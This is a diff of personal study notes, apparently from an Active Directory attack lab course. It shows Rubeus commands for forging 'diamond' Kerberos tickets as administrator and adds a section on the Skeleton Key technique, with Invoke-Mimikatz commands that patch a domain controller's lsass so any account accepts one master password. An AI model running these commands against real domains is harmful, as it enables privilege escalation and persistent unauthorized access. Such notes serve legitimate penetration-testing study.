@@ -10,7 +10,7 @@
 Rubeus.exe diamond
 /krbkey:$hash /user:studentx /password:StudentxPassword /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
-• We could also use /tgtdeleg option in place of credentials in case we have access as a domain user:
+• We could also use _/tgtdeleg_ option in place of credentials in case we have access as a domain user:
 ```powershell
 Rubeus.exe diamond /krbkey:$hash /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
@@ -70,6 +70,28 @@ BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.mo
 
 ![[Pasted image 20231215170136.png]]
 ![[Pasted image 20231215170247.png]]
+
+---
+### Skeleton Key
+- Skeleton key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password.
+- The attack was discovered by Dell Secureworks used in a malware named the Skeleton Key malware.
+- All the publicly known methods are NOT persistent across reboots.
+- Yet again, mimikatz to the rescue.
+
+#### Attack
+- Use the below command to inject a skeleton key (password would be
+mimikatz) on a Domain Controller of choice. DA privileges required
+```powershell
+Invoke-Mimikatz -Command '"privilege::debug"
+"misc::skeleton"' -ComputerName dcorp-
+dc.dollarcorp.moneycorp.local
+```
+• Now, it is possible to access any machine with a valid username and password as "mimikatz"
+```powershell
+`
+Enter-PSSession -Computername dcorp-dc -credential
+dcorp\Administrator
+Note that Skeleton Key is not opsec safe and is also known to cause issues with AD CS.
 
 
 
